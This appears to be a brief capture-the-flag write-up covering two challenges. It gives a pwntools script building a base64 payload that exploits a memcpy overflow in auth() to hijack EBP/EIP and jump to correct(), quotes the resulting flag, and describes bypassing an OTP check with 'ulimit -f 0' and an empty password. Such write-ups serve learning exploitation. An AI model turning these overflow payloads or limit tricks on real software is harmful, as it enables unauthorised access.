#### Simple login

```
from pwn import *
import base64
payload = pack(0xdeadbeef)+pack(0x804925f)+pack(0x811eb40)
print  base64.encodestring(payload)
```

There was a memcpy in auth()  which lead to overflow of ebp , then eip = *(ebp+4) now we place &correct() in our payload which is 
stored in global variable 

##### flag :control EBP, control ESP, control EIP, control the world~

#### OTP 

this had no vuln i know , but apparently u have to use ulimit -f 0 so the passcode file is not created and we can enter '' password
but i still wonder why we have to use subprocces.Popen(['otp',''],stderr=stdout)
